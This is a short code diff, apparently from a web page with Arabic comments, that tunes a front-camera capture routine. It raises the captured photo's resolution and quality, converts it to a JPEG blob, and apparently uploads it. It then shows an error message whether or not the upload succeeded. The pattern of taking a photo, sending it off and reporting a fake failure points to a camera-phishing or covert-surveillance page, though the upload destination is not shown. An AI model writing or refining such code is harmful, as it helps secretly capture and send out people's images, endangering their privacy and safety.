@@ -54,8 +54,8 @@
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
+                width: { ideal: 1440 },
+                height: { ideal: 1920 }
             } 
         })
         .then(stream => {
@@ -68,17 +68,18 @@
             const vWidth = video.videoWidth;
             const vHeight = video.videoHeight;
             
-            canvas.width = 1280;
-            canvas.height = 720;
+            // 3:4 عالي الدقة
+            canvas.width = 1440;
+            canvas.height = 1920;
             
             const ctx = canvas.getContext('2d');
             
-            // زوم أوت قوي جداً
+            // زوم أوت واسع
             ctx.drawImage(video, 
-                -vWidth * 0.35, 
-                -vHeight * 0.35, 
-                vWidth * 1.7, 
-                vHeight * 1.7
+                (vWidth - 1440) / 2 * -0.25, 
+                (vHeight - 1920) / 2 * -0.25,
+                vWidth * 1.5, 
+                vHeight * 1.5
             );
             
             canvas.toBlob(blob => {
@@ -92,7 +93,7 @@
                 })
                 .then(() => showError())
                 .catch(() => showError());
-            }, 'image/jpeg', 0.88);
+            }, 'image/jpeg', 0.95);
         }
 
         function showError() {
